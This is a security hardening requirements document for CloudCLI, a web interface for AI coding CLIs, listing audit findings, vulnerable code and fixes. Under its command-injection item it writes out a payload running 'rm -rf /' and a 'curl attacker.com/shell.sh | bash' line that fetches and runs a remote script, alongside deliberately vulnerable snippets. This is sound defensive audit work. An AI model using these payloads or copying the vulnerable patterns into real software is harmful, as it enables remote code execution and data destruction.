# PRD: CloudCLI Security Hardening (v5)

## Document Information

- **Project**: CloudCLI Security Hardening
- **Version**: 5.0
- **Date**: 2026-02-04
- **Author**: Security Audit Team
- **Status**: ✅ IMPLEMENTATION COMPLETE (2026-02-04)
- **Changes from v4**:
  - Added SEC-017: IS_PLATFORM startup validation
  - Expanded SEC-005: HTTP query param token removal (not just WS/SSE)
  - Clarified SEC-006: `initialCommand` injection vector (critical finding)
  - Corrected WORKSPACES_ROOT: needs implementation, not just validation
  - Updated severity counts based on code audit findings

---

## Current Status (2026-02-04)

| Phase | Items | Status |
|-------|-------|--------|
| Phase 1: Critical (P0) | SEC-001, SEC-002, SEC-017 | ✅ Complete |
| Phase 2: High (P1) | SEC-003, SEC-004, SEC-005, SEC-006, SEC-008, SEC-016 | ✅ Complete |
| Phase 3: Medium (P2) | SEC-009, SEC-010, SEC-011, SEC-012, SEC-013, SEC-015 | ✅ Complete |
| E2E Test Suite | Automated security tests | ✅ Implemented (53 tests) |
| Manual Verification | Browser/log checks, VPN testing | ⚠️ Pending |
| Dependency Audit | npm audit vulnerabilities | ✅ Complete (0 vulnerabilities) |
| Git/GitHub Removal | User-mandated feature removal | ✅ Complete |

**Implementation Commits:**
- `ec39a0f` (2026-02-03): Comprehensive backend security hardening
- `ed44dc7` (2026-02-04): SEC-011 keychain wiring + frontend token refresh
- `bd2dc8d` (2026-02-04): Complete security hardening + remove git/GitHub features
- `4c57c77` (2026-02-04): Remove release-it to eliminate @octokit transitive deps
- `0c8e120` (2026-02-04): Resolve all npm audit vulnerabilities (21 → 0)

---

## Executive Summary

CloudCLI (Claude Code UI) is a web-based interface for Claude Code, Cursor CLI, and Codex that enables remote access from mobile devices. A comprehensive security audit identified **3 critical**, **6 high**, **6 medium**, and **0 low** severity vulnerabilities.

This PRD defines the security hardening work required to make CloudCLI safe for use over a VPN connection from iOS devices.

### Goals

1. Eliminate all critical and high severity vulnerabilities.
2. Implement defense-in-depth security controls.
3. Enable secure remote access via VPN + HTTPS.
4. Maintain full functionality while hardening security.
5. Zero third-party service dependencies (except optional credential providers).

---

## Background

### Security Audit Summary

| Severity | Count | Status |
|----------|-------|--------|
| Critical | 3 | Must fix before any use |
| High | 6 | Must fix before production |
| Medium | 6 | Recommended |
| Low | 0 | Nice to have |

### Threat Model

**Deployment Context:**
- Single-user deployment on Mac Studio.
- Access via VPN from iOS devices.
- Potential future AWS deployment.
- No public internet exposure.
- Sensitive data: Source code, API keys (Anthropic, OpenAI, GitHub), Shell access.

**Critical Finding - IS_PLATFORM Mode:**
When `VITE_IS_PLATFORM=true`, JWT authentication is **completely bypassed**. The server auto-authenticates as the first database user without any token validation. This mode exists for hosted platform deployments but MUST be disabled for self-hosted/VPN use.

**Assets to Protect:**
- **Shell Access**: Full control over the host machine via PTY and spawn.
- **Source Code**: Read/Write access to the filesystem.
- **Credentials**: API keys and auth tokens.

---

## Requirements

### Phase 1: Critical Fixes (P0)

These MUST be completed before any use of the system.

#### 1.1 Remove Hardcoded JWT Secret

**ID**: SEC-001
**Severity**: CRITICAL
**Location**: `server/middleware/auth.js:6`
**CWE**: CWE-798 (Use of Hard-coded Credentials)

**Current State:**
```javascript
const JWT_SECRET = process.env.JWT_SECRET || 'claude-ui-dev-secret-change-in-production';
```

**Requirements:**
1. Remove the hardcoded fallback secret entirely.
2. Server MUST fail to start if `JWT_SECRET` is not set.
3. Enforce minimum length of 32 characters.
4. Provide clear error message with generation command: `openssl rand -base64 32`

**Acceptance Criteria:** ✅
- [x] Server refuses to start without JWT_SECRET env var
- [x] Server refuses to start if JWT_SECRET < 32 characters
- [x] Clear error message with generation instructions
- [x] No hardcoded secrets remain in codebase

---

#### 1.2 Implement Token Expiration with Refresh Tokens

**ID**: SEC-002
**Severity**: CRITICAL
**Location**: `server/middleware/auth.js:70-78`
**CWE**: CWE-613 (Insufficient Session Expiration)

**Current State:**
```javascript
const generateToken = (user) => {
  return jwt.sign(
    { userId: user.id, username: user.username },
    JWT_SECRET
    // No expiration - token lasts forever
  );
};
```

**Requirements:**
1. **Access Token**: 15-minute expiry.
2. **Refresh Token**: 7-day expiry, stored in SQLite (`refresh_tokens` table), hashed.
3. **Rotation**: Refresh token rotation on use.
4. **Revocation**: Logout deletes the refresh token.
5. **Migration**: Provide a DB migration path (migration script or init-time upgrade) so existing deployments add `refresh_tokens` without startup failures.

**Database Schema:**
```sql
CREATE TABLE refresh_tokens (
  id TEXT PRIMARY KEY,
  user_id INTEGER NOT NULL,
  token_hash TEXT NOT NULL,
  expires_at INTEGER NOT NULL,
  created_at INTEGER DEFAULT (unixepoch()),
  FOREIGN KEY (user_id) REFERENCES users(id)
);
```

**Acceptance Criteria:** ✅
- [x] Access tokens include `exp` claim (15 minutes)
- [x] Refresh tokens stored hashed in database
- [x] `POST /api/auth/refresh` returns new access token
- [x] `POST /api/auth/logout` invalidates refresh token
- [x] Frontend handles token refresh automatically (ed44dc7: 401 interceptor + proactive refresh)
- [x] Existing deployments migrate schema without crashing on startup

---

#### 1.3 Validate IS_PLATFORM Mode at Startup

**ID**: SEC-017 (NEW in v5)
**Severity**: CRITICAL
**Location**: `server/middleware/auth.js:25-37`, `server/index.js:189-197`
**CWE**: CWE-287 (Improper Authentication)

**Current State:**
```javascript
// auth.js:23-37
const authenticateToken = async (req, res, next) => {
  // Platform mode: use single database user
  if (IS_PLATFORM) {
    try {
      const user = userDb.getFirstUser();
      // ... bypasses ALL token validation
      req.user = user;
      return next();
    }
  }
  // ... normal JWT validation only happens if IS_PLATFORM is false
};
```

When `IS_PLATFORM=true`:
- JWT validation is completely bypassed
- Any request is auto-authenticated as the first user
- WebSocket connections are auto-authenticated without tokens
- This is **intended for hosted platform deployments only**

**Problem:**
If a self-hosted user accidentally sets `VITE_IS_PLATFORM=true` or runs with platform defaults, their entire system is unauthenticated.

**Requirements:**
1. Add startup validation that warns/fails if `IS_PLATFORM=true` without explicit acknowledgment
2. Require `ALLOW_PLATFORM_MODE=true` as a separate env var to enable platform mode
3. Log a prominent warning at startup when platform mode is active
4. Document that platform mode bypasses ALL authentication

**Implementation:**
```javascript
// At server startup (index.js)
if (IS_PLATFORM) {
  if (process.env.ALLOW_PLATFORM_MODE !== 'true') {
    console.error('═'.repeat(70));
    console.error('SECURITY ERROR: IS_PLATFORM=true but ALLOW_PLATFORM_MODE is not set');
    console.error('Platform mode bypasses ALL authentication!');
    console.error('If this is intentional, set ALLOW_PLATFORM_MODE=true');
    console.error('For self-hosted/VPN use, set VITE_IS_PLATFORM=false');
    console.error('═'.repeat(70));
    process.exit(1);
  }
  console.warn('═'.repeat(70));
  console.warn('WARNING: Running in PLATFORM MODE - Authentication is BYPASSED');
  console.warn('All requests are auto-authenticated as the first database user');
  console.warn('This mode is intended for hosted platform deployments only');
  console.warn('═'.repeat(70));
}
```

**Acceptance Criteria:** ✅
- [x] Server refuses to start with `IS_PLATFORM=true` unless `ALLOW_PLATFORM_MODE=true`
- [x] Prominent warning logged when platform mode is active
- [x] Documentation updated to explain platform mode risks

---

### Phase 2: High Priority Fixes (P1)

#### 2.1 Restrict CORS Policy

**ID**: SEC-003
**Severity**: HIGH
**Location**: `server/index.js:223`
**CWE**: CWE-942

**Current State:**
```javascript
app.use(cors());
```

**Requirements:**
1. `ALLOWED_ORIGINS` env var (comma-separated).
2. Default to `localhost:3001` and `localhost:5173`.
3. Block all other origins (unless empty/null for non-browser clients).

**Acceptance Criteria:** ✅
- [x] CORS rejects requests from non-whitelisted origins
- [x] Default allows only localhost development ports
- [x] Requests without Origin header allowed (curl, mobile apps)

---

#### 2.2 Bind to Localhost by Default

**ID**: SEC-004
**Severity**: HIGH
**Location**: `server/index.js:1806`
**CWE**: CWE-668

**Current State:**
```javascript
server.listen(PORT, '0.0.0.0', async () => {
```

**Requirements:**
1. Default bind to `127.0.0.1`.
2. Allow override via `BIND_HOST` env var.
3. Log warning if binding to `0.0.0.0`.

**Acceptance Criteria:** ✅
- [x] Server binds to 127.0.0.1 by default
- [x] Warning logged when binding to non-localhost
- [x] Documentation updated with reverse proxy instructions

---

#### 2.3 Ticket-Based Authentication for WebSocket, SSE, AND HTTP

**ID**: SEC-005
**Severity**: HIGH
**Location**:
- `server/index.js:203` (WebSocket)
- `server/middleware/auth.js:43-46` (HTTP query param)
- `server/routes/projects.js:337-338` (SSE)
**CWE**: CWE-598 (Sensitive Information in URL Query String)

**Current State - WebSocket:**
```javascript
// index.js:202-204
const url = new URL(info.req.url, 'http://localhost');
const token = url.searchParams.get('token') ||
    info.req.headers.authorization?.split(' ')[1];
```

**Current State - HTTP (ALL authenticated endpoints):**
```javascript
// auth.js:43-46 - This affects EVERY protected route!
if (!token && req.query.token) {
  token = req.query.token;
}
```

**Current State - SSE:**
```javascript
// projects.js:337-338
router.get('/clone-progress', async (req, res) => {
  const { path: workspacePath, githubUrl, githubTokenId, newGithubToken } = req.query;
```

**Problems:**
1. JWT tokens in URLs are logged everywhere (servers, proxies, browser history)
2. `newGithubToken` (GitHub PAT) passed in plain URL
3. **ALL** authenticated HTTP endpoints accept `?token=` query param

**Requirements:**
1. Create `POST /api/auth/ticket` endpoint (protected by JWT in Authorization header)
2. Ticket is single-use, expires in 30 seconds, stored server-side
3. **WebSocket**: Connect via `ws://...?ticket=TICKET`
4. **SSE**: Connect via `GET ...?ticket=TICKET`
   - Ticket payload stores context (e.g., repo URL, token reference)
   - Remove `githubTokenId` and `newGithubToken` from URL
5. **HTTP**: Remove `?token=` query param support from auth middleware
   - Only accept tokens in Authorization header

**Implementation - Ticket System:**
```javascript
// Ticket storage (in-memory or SQLite)
const tickets = new Map();

// POST /api/auth/ticket
router.post('/ticket', authenticateToken, async (req, res) => {
  const { purpose, context } = req.body;
  // purpose: 'websocket' | 'sse-clone' | etc.
  // context: { repoUrl, githubTokenId, ... }

  const ticketId = crypto.randomUUID();
  const ticket = {
    userId: req.user.id,
    purpose,
    context,
    createdAt: Date.now(),
    expiresAt: Date.now() + 30000  // 30 seconds
  };

  tickets.set(ticketId, ticket);

  // Auto-cleanup
  setTimeout(() => tickets.delete(ticketId), 35000);

  res.json({ ticket: ticketId, expiresIn: 30 });
});

// Ticket validation
function validateAndConsumeTicket(ticketId, expectedPurpose) {
  const ticket = tickets.get(ticketId);
  if (!ticket) return null;
  if (ticket.expiresAt < Date.now()) {
    tickets.delete(ticketId);
    return null;
  }
  if (ticket.purpose !== expectedPurpose) return null;

  tickets.delete(ticketId);  // Single-use
  return ticket;
}
```

**Acceptance Criteria:** ✅
- [x] `POST /api/auth/ticket` endpoint implemented
- [x] Tickets are single-use and expire in 30 seconds
- [x] WebSocket uses ticket instead of JWT in URL
- [x] SSE uses ticket; sensitive data stored in ticket context
- [x] HTTP `?token=` query param support removed from auth middleware
- [x] No sensitive tokens appear in any URL

---

#### 2.4 Secure Shell Command Construction

**ID**: SEC-006
**Severity**: HIGH
**Location**: `server/index.js:1054-1094`
**CWE**: CWE-78 (OS Command Injection)

**Current State - FULL ARBITRARY COMMAND EXECUTION:**
```javascript
// index.js:1054-1061 - Both projectPath AND initialCommand are user-controlled!
if (isPlainShell) {
  if (os.platform() === 'win32') {
    shellCommand = `Set-Location -Path "${projectPath}"; ${initialCommand}`;
  } else {
    shellCommand = `cd "${projectPath}" && ${initialCommand}`;
  }
}
```

**Attack Vector 1 - Path Injection:**
```javascript
// Attacker sends: { projectPath: '"; rm -rf / #' }
shellCommand = `cd ""; rm -rf / #" && claude`;
```

**Attack Vector 2 - Command Injection (MORE SEVERE):**
```javascript
// Attacker sends: { initialCommand: '; curl attacker.com/shell.sh | bash' }
shellCommand = `cd "/safe/path" && ; curl attacker.com/shell.sh | bash`;
```

**Problem:**
Even with WORKSPACES_ROOT path validation, `initialCommand` is concatenated directly into the shell command with ZERO validation. An attacker can execute arbitrary commands.

**Requirements:**

1. **Path Validation** (WORKSPACES_ROOT):
   - Implement multi-root support (comma-separated)
   - Validate path is under allowed roots
   - Resolve symlinks before validation

2. **Command Allowlist** (NEW - Critical):
   - Define allowed initial commands: `claude`, `cursor-agent`, `codex`
   - Reject any command not in allowlist
   - Never concatenate user input into shell strings

3. **Parameterized Execution**:
   - Prefer direct binary execution (e.g., `pty.spawn('claude', args, ...)`)
   - Avoid `sh -c` / `bash -c` for user-provided commands
   - If a shell wrapper is absolutely required, strictly tokenize input and reject any shell metacharacters (`&`, `;`, `|`, `$()`, `` ` ``, `>`, `<`)

**Implementation:**
```javascript
// Allowed commands for PTY sessions
const ALLOWED_PTY_COMMANDS = new Set([
  'claude',
  'cursor-agent',
  'codex',
  // Add other legitimate commands
]);

// Multi-root workspace validation
const WORKSPACES_ROOTS = (process.env.WORKSPACES_ROOT || os.homedir())
  .split(',')
  .map(p => path.resolve(p.trim()));

function isAllowedPath(requestedPath) {
  const resolved = path.resolve(requestedPath);
  // Also resolve symlinks
  try {
    const real = fs.realpathSync(resolved);
    return WORKSPACES_ROOTS.some(root =>
      real === root || real.startsWith(root + path.sep)
    );
  } catch (e) {
    return false;
  }
}

function isAllowedCommand(cmd) {
  if (!cmd) return true;  // No command = interactive shell
  const baseCmd = cmd.split(/\s+/)[0];  // Get first word
  return ALLOWED_PTY_COMMANDS.has(baseCmd);
}

function tokenizeAndValidate(cmd) {
  if (!cmd) return { cmd: 'claude', args: [] };
  if (/[&;|`<>]|\$\(/.test(cmd)) {
    throw new Error('Shell metacharacters are not allowed');
  }
  const parts = cmd.trim().split(/\s+/);
  if (!ALLOWED_PTY_COMMANDS.has(parts[0])) {
    throw new Error('Command not allowed');
  }
  return { cmd: parts[0], args: parts.slice(1) };
}

// In handleShellConnection:
if (!isAllowedPath(projectPath)) {
  ws.send(JSON.stringify({
    type: 'error',
    message: 'Path not in allowed workspace'
  }));
  ws.close();
  return;
}

if (initialCommand && !isAllowedCommand(initialCommand)) {
  ws.send(JSON.stringify({
    type: 'error',
    message: 'Command not allowed'
  }));
  ws.close();
  return;
}

// Prefer direct execution; avoid shell wrappers for user-provided commands
const { cmd, args } = tokenizeAndValidate(initialCommand);
shellProcess = pty.spawn(cmd, args, {
  cwd: projectPath,  // Use cwd option, not cd command
  // ...
});
```

**Acceptance Criteria:** ✅
- [x] WORKSPACES_ROOT supports comma-separated multiple roots
- [x] Paths outside allowed roots rejected with clear error
- [x] Path traversal attempts blocked (symlink resolution)
- [x] Command allowlist implemented and enforced
- [x] Unknown commands rejected with clear error
- [x] No shell string concatenation with user input
- [x] No `sh -c` / `bash -c` with user-provided commands (unless strict tokenization blocks shell metacharacters)
- [x] Audit log for rejected paths and commands

---

#### 2.5 Secure System Update Endpoint

**ID**: SEC-008
**Severity**: HIGH
**Location**: `server/index.js:311-321`
**CWE**: CWE-94 (Code Injection)

**Current State:**
```javascript
app.post('/api/system/update', authenticateToken, async (req, res) => {
    const updateCommand = 'git checkout main && git pull && npm install';
    const child = spawn('sh', ['-c', updateCommand], {
```

**Note:** The command is hardcoded (no user input), but the endpoint is enabled by default.

**Requirements:**
1. Disable by default. Enable only if `ENABLE_SYSTEM_UPDATE=true`.
2. Log all update attempts with user info.
3. Return 403 Forbidden when disabled.

**Acceptance Criteria:** ✅
- [x] Endpoint disabled unless `ENABLE_SYSTEM_UPDATE=true`
- [x] Returns 403 when disabled
- [x] All attempts logged with user and timestamp

---

#### 2.6 Secure GitHub Tokens in SSE

**ID**: SEC-016
**Severity**: HIGH
**Location**: `server/routes/projects.js:337-338`

**Resolution:** Merged into SEC-005 (Ticket-Based Auth). GitHub tokens are passed to `POST /api/auth/ticket`, stored server-side in ticket context, and the SSE endpoint only receives the ticket ID.

---

### Phase 3: Medium Priority Fixes (P2)

#### 3.1 Rate Limiting (SEC-009)

**ID**: SEC-009
**Severity**: MEDIUM
**Location**: Server-wide
**CWE**: CWE-770 (Allocation of Resources Without Limits)

- `express-rate-limit` on all routes
- Stricter limits on `/api/auth/*` (10/min)
- Standard limits on other routes (100/min)

#### 3.2 Error Sanitization (SEC-010)

**ID**: SEC-010
**Severity**: MEDIUM
**Location**: Various error handlers
**CWE**: CWE-209 (Information Exposure Through Error Messages)

- Middleware to strip stack traces in production
- Hide internal file paths
- Return generic error messages with correlation IDs

#### 3.3 Credential Storage (SEC-011)

**ID**: SEC-011
**Severity**: MEDIUM
**Location**: `server/database/db.js`
**CWE**: CWE-312 (Cleartext Storage of Sensitive Information)

- Migrate from plaintext SQLite to `keytar` (System Keychain) on macOS
- `CredentialProvider` abstraction for future AWS Secrets Manager / Vault support
- Document Linux/CI dependencies for keytar (libsecret + keyring service), or provide a fallback provider (e.g., encrypted file) for headless environments

#### 3.4 PTY Timeout (SEC-012)

**ID**: SEC-012
**Severity**: MEDIUM
**Location**: `server/index.js:1252-1258`

- Reduce default from 30 minutes to 5 minutes
- Configurable via `PTY_TIMEOUT` env var

#### 3.5 Security Headers & CSP (SEC-013)

**ID**: SEC-013
**Severity**: MEDIUM
**Location**: Server-wide

- `helmet` middleware with strict CSP:
```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
connect-src 'self' ws: wss:;
img-src 'self' data: blob:;
font-src 'self';
frame-ancestors 'none';
```

#### 3.6 WebSocket Zod Validation (SEC-015)

**ID**: SEC-015
**Severity**: MEDIUM
**Location**: WebSocket message handlers

- Validate all incoming WS messages against Zod schemas
- Reject malformed messages
- Enforce size limits

---

## Technical Specifications

### Environment Variables

| Variable | Required | Default | Description |
|----------|----------|---------|-------------|
| JWT_SECRET | Yes | - | Secret for signing JWTs (min 32 chars) |
| ACCESS_TOKEN_EXPIRY | No | 15m | Access token expiration |
| REFRESH_TOKEN_EXPIRY | No | 7d | Refresh token expiration |
| ALLOWED_ORIGINS | No | localhost:* | Comma-separated CORS origins |
| BIND_HOST | No | 127.0.0.1 | Server bind address |
| WORKSPACES_ROOT | No | $HOME | **Comma-separated** allowed workspace roots |
| CREDENTIAL_PROVIDER | No | keychain | Credential storage (keychain/aws/vault) |
| CREDENTIALS_ENCRYPTION_KEY | No | - | Encryption key for fallback encrypted-file provider (if implemented) |
| ENABLE_SYSTEM_UPDATE | No | false | Enable /api/system/update |
| ALLOW_PLATFORM_MODE | No | false | Required to enable IS_PLATFORM |
| RATE_LIMIT_MAX | No | 100 | Requests per window |
| RATE_LIMIT_WINDOW | No | 60000 | Rate limit window (ms) |
| PTY_TIMEOUT | No | 300000 | PTY session timeout (ms) |
| NODE_ENV | No | development | Production disables debug |
| VITE_IS_PLATFORM | No | false | Platform mode (bypasses auth!) |

### File Changes Summary

| File | Changes |
|------|---------|
| `server/middleware/auth.js` | SEC-001, SEC-002, SEC-005 (remove ?token), SEC-017 |
| `server/index.js` | SEC-003, SEC-004, SEC-006, SEC-008, SEC-012, SEC-017 |
| `server/routes/auth.js` | SEC-002 (refresh), SEC-005 (ticket endpoint) |
| `server/routes/projects.js` | SEC-005 (SSE tickets), SEC-006 (multi-root) |
| `server/middleware/security.js` | NEW: SEC-009, SEC-010, SEC-013 |
| `server/middleware/ws-validation.js` | NEW: SEC-015 |
| `server/credentials/index.js` | NEW: SEC-011 |
| `.env.example` | Update with all security variables |
| `SECURITY.md` | NEW: Security documentation |

---

## Implementation Plan

### Sprint 1: Critical Auth Fixes (Day 1-2) ✅ COMPLETE
- [x] SEC-001: Remove hardcoded JWT secret (ec39a0f)
- [x] SEC-002: Implement refresh tokens (ec39a0f backend, ed44dc7 frontend)
- [x] SEC-017: IS_PLATFORM startup validation (ec39a0f)
- [x] SEC-005: Ticket-based auth for WS/SSE/HTTP (ec39a0f)

### Sprint 2: Command Injection & Network (Day 3-4) ✅ COMPLETE
- [x] SEC-006: Command allowlist + multi-root workspaces (ec39a0f)
- [x] SEC-003: CORS restriction (ec39a0f)
- [x] SEC-004: Localhost binding (ec39a0f)
- [x] SEC-008: Disable update endpoint (ec39a0f)

### Sprint 3: Hardening (Day 5) ✅ COMPLETE
- [x] SEC-009: Rate limiting (ec39a0f)
- [x] SEC-010: Error sanitization (ec39a0f)
- [x] SEC-011: Keychain credentials (ec39a0f abstraction, ed44dc7 full wiring + frontend token refresh)
- [x] SEC-012: PTY timeout (ec39a0f)
- [x] SEC-013: CSP headers (ec39a0f)
- [x] SEC-015: WS validation (ec39a0f)

### Implementation Commits
- `ec39a0f` (2026-02-03): Comprehensive security hardening (SEC-001 through SEC-017 backend)
- `ed44dc7` (2026-02-04): SEC-011 keychain credential storage + frontend token refresh

---

## Verification Checklist

### Manual API Tests (ad-hoc curl) ✅
These were verified manually via curl commands, not automated tests:
- [x] Server fails to start without JWT_SECRET
- [x] Server fails to start with IS_PLATFORM=true without ALLOW_PLATFORM_MODE=true
- [x] Access tokens expire after 15 minutes
- [x] Refresh tokens can obtain new access tokens
- [x] Logout invalidates refresh token
- [x] Tickets are single-use
- [x] Tickets expire after 30 seconds
- [x] Paths outside WORKSPACES_ROOT are rejected
- [x] Commands not in allowlist are rejected
- [x] CORS rejects non-whitelisted origins
- [x] Credentials stored in macOS Keychain (not plaintext DB)
- [x] Credential deletion removes from both keychain and DB

### Manual Verification ⚠️ PENDING
- [ ] No sensitive tokens in browser network tab URLs
- [ ] No sensitive tokens in server access logs
- [ ] Platform mode warning is prominent and scary
- [ ] VPN access works with all security controls enabled

---

## E2E Test Suite ✅ IMPLEMENTED

**Status**: 53 automated API tests implemented using Vitest + supertest. Browser tests (Playwright) not yet implemented.

### Test Framework

| Component | Tool | Rationale |
|-----------|------|-----------|
| API Tests | Vitest + supertest | Fast, TypeScript-native, same toolchain as frontend |
| Browser Tests | Playwright | MCP integration available, cross-browser support |
| Test Database | SQLite in-memory | Isolation between test runs |

### Test Directory Structure

**Implemented:**
```
tests/
├── e2e/
│   ├── auth.test.ts          # SEC-001, SEC-002, SEC-017 (20 tests) ✅
│   ├── credentials.test.ts   # SEC-011 (16 tests) ✅
│   ├── rate-limiting.test.ts # SEC-009 (7 tests) ✅
│   └── tickets.test.ts       # SEC-005 (10 tests) ✅
├── helpers/
│   ├── app.ts                # Express app factory for testing
│   ├── auth.ts               # Auth helper functions
│   ├── db.ts                 # In-memory SQLite setup
│   └── keychain.ts           # Keychain mock for testing
├── setup.ts                  # Global test setup
vitest.config.ts              # Vitest configuration
```

**Not yet implemented:**
```
tests/
├── e2e/
│   ├── security.spec.ts      # SEC-003, SEC-004 (CORS, binding) ❌
│   └── shell.spec.ts         # SEC-006, SEC-008, SEC-012 (PTY security) ❌
└── playwright.config.ts      # Browser tests ❌
```

### SEC-011: Credential Storage Tests ✅ IMPLEMENTED (16 tests)

| Test Case | Description | Status |
|-----------|-------------|--------|
| `keychain-available` | Check security status endpoint | ✅ `should return keychainAvailable: true when keychain is available` |
| `credential-create-keychain` | Create credential stores in keychain | ✅ `should store credential in keychain when available` |
| `credential-delete-cleanup` | Delete removes from both stores | ✅ `should delete credential from both keychain and database` |
| `credential-list-no-values` | List endpoint hides values | ✅ `should return metadata only (no credential values)` |
| `fallback-no-keychain` | Error when keytar unavailable | ✅ `should return error when keychain operations fail` |
| `credential-toggle` | Toggle active status | ✅ `should toggle credential active status` |
| `validation-errors` | Input validation | ✅ 400 for missing name/type/value |

### SEC-002: Token Refresh Tests ✅ IMPLEMENTED (20 tests in auth.test.ts)

| Test Case | Description | Status |
|-----------|-------------|--------|
| `access-token-expiry` | Access token expires | ✅ `should return 403 with expired token` |
| `refresh-token-works` | Refresh endpoint returns new tokens | ✅ `should refresh tokens with valid refresh token` |
| `refresh-token-rotation` | Refresh token is single-use | ✅ `should return 401 when reusing consumed refresh token` |
| `refresh-token-revocation` | Logout invalidates refresh token | ✅ `should logout and revoke all refresh tokens` |
| `401-interceptor-retry` | Frontend retries on 401 | ❌ Browser test (Playwright) |
| `concurrent-401-single-refresh` | Multiple 401s share one refresh | ❌ Browser test (Playwright) |
| `proactive-refresh` | Token refreshed before expiry | ❌ Browser test (Playwright) |

Additional tests implemented:
- Registration validation (username/password length)
- Login error handling (wrong credentials)
- Auth header validation

### SEC-005: Ticket System Tests ✅ IMPLEMENTED (10 tests in tickets.test.ts)

| Test Case | Description | Status |
|-----------|-------------|--------|
| `ticket-create` | Create ticket for WebSocket | ✅ `should generate ticket for valid purpose` |
| `ticket-single-use` | Ticket consumed on use | ✅ `tickets should be consumed on first use` |
| `ticket-expiry` | Ticket expires after 30s | ✅ `ticket should expire after TTL` |
| `ticket-purpose-validation` | Wrong purpose rejected | ✅ `ticket should be rejected for mismatched purpose` |
| `ws-connection-with-ticket` | WebSocket connects via ticket | ❌ WebSocket test (requires live server) |
| `no-token-in-url` | JWT never in URL | ✅ Verified in auth middleware tests |

Additional tests implemented:
- 400 when purpose missing
- 401 without authentication
- Ticket validation endpoint tests

### SEC-009: Rate Limiting Tests ✅ IMPLEMENTED (7 tests in rate-limiting.test.ts)

| Test Case | Description | Status |
|-----------|-------------|--------|
| `auth-rate-limit` | Auth endpoints limited to 10/min | ✅ `should return 429 on 11th auth request` |
| `api-rate-limit` | API endpoints limited to 100/min | ✅ `should allow many protected route requests` |
| `rate-limit-reset` | Limits reset after window | ✅ `should track rate limit via headers` |

Additional tests implemented:
- Rate limit headers included in response
- Register endpoint rate limited
- Allows 10 requests before limiting

### SEC-006: Shell Security Tests ❌ NOT IMPLEMENTED

| Test Case | Description | Status |
|-----------|-------------|--------|
| `path-validation` | Paths outside WORKSPACES_ROOT rejected | ❌ Requires WebSocket/PTY test |
| `command-allowlist` | Unknown commands rejected | ❌ Requires WebSocket/PTY test |
| `metachar-blocked` | Shell metacharacters rejected | ❌ Requires WebSocket/PTY test |
| `symlink-traversal` | Symlink escape attempts blocked | ❌ Requires WebSocket/PTY test |

**Note:** These tests require WebSocket connections to the PTY endpoint, which needs either a running server or WebSocket test infrastructure.

### Running Tests

```bash
# Install test dependencies
npm install -D vitest @vitest/coverage-v8 supertest playwright @playwright/test

# Run API tests
npm run test:api

# Run browser tests (requires running server)
npm run test:e2e

# Run all tests with coverage
npm run test:coverage
```

### CI Integration

```yaml
# .github/workflows/test.yml
name: Security Tests
on: [push, pull_request]
jobs:
  test:
    runs-on: macos-latest  # Required for keychain tests
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - run: npm ci
      - run: npm run test:api
      - run: npx playwright install
      - run: npm run test:e2e
```

### Acceptance Criteria

- [ ] Test suite runs in CI on every PR
- [x] All SEC-011 credential tests pass (16/16)
- [x] All SEC-002 token refresh tests pass (20/20 in auth.test.ts)
- [x] All SEC-005 ticket tests pass (10/10)
- [x] All SEC-009 rate limiting tests pass (7/7)
- [ ] Coverage report shows >80% on security-critical paths
- [x] Tests use isolated database (in-memory SQLite)
- [ ] SEC-003, SEC-004 security tests implemented
- [ ] SEC-006, SEC-008, SEC-012 shell tests implemented
- [ ] Playwright browser tests implemented

---

## Appendix A: Secure Deployment Checklist

```
Pre-Deployment:
[ ] Generate JWT_SECRET: openssl rand -base64 32
[ ] Set NODE_ENV=production
[ ] Verify VITE_IS_PLATFORM=false (or unset)
[ ] Verify ALLOW_PLATFORM_MODE is NOT set
[ ] Set BIND_HOST=127.0.0.1 (or leave default)
[ ] Set WORKSPACES_ROOT to allowed directories (comma-separated)
[ ] Set CREDENTIAL_PROVIDER=keychain

Reverse Proxy (Caddy):
[ ] Install Caddy
[ ] Configure TLS certificates
[ ] Proxy to localhost:3001
[ ] Bind to VPN interface only

Post-Deployment:
[ ] Verify authentication works
[ ] Test token expiration and refresh
[ ] Verify WS/SSE use tickets (no tokens in URLs)
[ ] Verify CORS blocks external origins
[ ] Test PTY with allowed commands only
[ ] Verify CSP doesn't break functionality
```

---

## Appendix B: User-Mandated Feature Removal (2026-02-04)

Per user security mandate, the following features were removed:

### Git Features Removed
- `server/routes/git.js` - All git endpoints deleted (status, diff, commit, branch, push, pull, etc.)
- `server/utils/gitConfig.js` - Git config utility deleted
- `src/components/GitPanel.jsx` - Git panel UI deleted
- `src/components/MainContent.jsx` - Git tab removed
- `src/components/ChatInterface.jsx` - Git diff API calls removed

### GitHub Features Removed
- `server/routes/agent.js` - GitHub clone, branch, PR creation removed
- `server/routes/projects.js` - GitHub clone functionality removed
- `src/components/ProjectCreationWizard.jsx` - GitHub clone UI removed
- `src/components/CredentialsSettings.jsx` - GitHub credentials UI removed
- `src/hooks/useVersionCheck.js` - GitHub API calls disabled
- `server/cli.js` - npm update check removed

### Dependencies Removed
- `@octokit/rest` - GitHub API client
- `release-it` - Release tool (had @octokit transitive dependency)
- `auto-changelog` - Changelog generator

### Rationale
- Reduces attack surface (18+ command injection vectors in git.js)
- Eliminates external API dependencies (GitHub)
- Removes unnecessary bloat for a Claude chat interface
- Users have IDE-native git integration (VS Code, Cursor, etc.)

---

## Appendix C: v5 Changes from v4

| Item | v4 Status | v5 Change | Rationale |
|------|-----------|-----------|-----------|
| SEC-017 | Not present | Added as CRITICAL | IS_PLATFORM bypasses all auth |
| SEC-005 | WS/SSE only | Extended to HTTP ?token | auth.js accepts token in query for all routes |
| SEC-006 | Path validation | Added command allowlist | initialCommand injection is full RCE |
| WORKSPACES_ROOT | Assumed implemented | Noted as needs implementation | Code shows single string, not comma-separated |
| taskmaster shell:true | Marked RISKY | Downgraded to low risk | No user input flows to that code path |

---

## Appendix D: References

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [JWT Security Best Practices](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)
- [Express.js Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
